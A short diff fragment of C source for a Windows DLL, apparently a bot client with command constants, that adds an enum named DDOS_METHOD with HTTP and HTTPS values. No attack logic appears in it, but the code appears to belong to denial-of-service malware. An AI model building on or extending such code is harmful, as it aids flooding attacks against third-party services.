@@ -17,6 +17,12 @@ void Main();
 #define AUTH 0x01
 #define SUCCESS 0x0F
 
+enum DDOS_METHOD {
+	HTTP = 0x40,
+	HTTPS = 0x41,
+	UNKNOWN = 0x00
+};
+
 BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) {
 	switch (dwReason) {
 	case DLL_PROCESS_ATTACH:
